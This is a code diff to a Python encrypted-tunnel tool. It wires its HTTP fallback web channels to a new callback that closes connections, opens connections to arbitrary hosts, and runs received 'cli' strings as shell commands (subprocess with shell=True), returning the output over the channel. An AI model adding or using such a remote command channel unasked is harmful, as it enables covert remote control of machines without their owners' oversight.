@@ -1,4 +1,5 @@
 import os
+import platform
 import threading
 import argparse
 from utils.EncryptedSocket import EncryptedSocket, EncryptionParams
@@ -20,6 +21,7 @@ import queue
 import socket
 from datetime import datetime
 from web.WebCommandParser import WebCommandParser
+from web.CmdRelay import set_channel
 
 OPT_QUIT = 0xFF
 OPT_PING = 0x01
@@ -1050,6 +1052,41 @@ class ConsoleThread(threading.Thread):
                 print(str(e))
                 traceback.print_exc()
 
+def webCommandParserCallback(enc_keys, command):
+    if command["cmd"] == 'closeall':
+        for thread in _socket_threads:
+            thread.close()
+        _socket_threads.clear()
+
+        if "output" in command:
+            set_channel(enc_keys, command["output"], -1, "Closed all connections")
+
+    elif command["cmd"] == 'connect':
+        con_thread = ConnectionMonitorThread(_tunnel_mode, command["socket_mode"], command["host"], int(command["port"]), enc_keys)
+        con_thread.start()
+        _connection_monitor_threads.append(con_thread)
+
+        if "output" in command:
+            set_channel(enc_keys, command["output"], -1, "Appended connection to list")
+
+    elif command["cmd"] == 'cli':
+        if "output" in command:
+            set_channel(enc_keys, command["output"], -1, f"Running command {command['command']}")
+        
+        def run_command_with_timeout(command, timeout):
+            print("Executing: "+ command + " with timeout: "+ str(timeout))
+            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            try:
+                output, error = process.communicate(timeout=timeout)
+                return process.pid, output
+            except subprocess.TimeoutExpired:
+                return process.pid, None
+
+        pid, output = run_command_with_timeout(command['command'], int(command['timeout']))
+        if output:
+            set_channel(enc_keys, command["output"], -1, "{}: {}".format(pid, output.decode()))
+            
+
 # Define a signal handler for SIGINT (Control+C)
 def signal_handler(sig, frame):
     global _controlc_count
@@ -1087,8 +1124,12 @@ def main():
         _connection_monitor_threads.append(con_thread)
 
     for http_fallback in http_fallbacks:
-        wcp = WebCommandParser(http_fallback['url'], http_fallback['channel'], enc_keys)
+        url = http_fallback[0]
+        channel = http_fallback[1]
+        print(f"Initialising http fallback monitor: {url} : {channel}")
+        wcp = WebCommandParser(url, channel, enc_keys)
         wcp.start()
+        wcp.set_callback(webCommandParserCallback)
         _http_fallbacks.append(wcp)
         
     if len(_socket_threads) > 0:
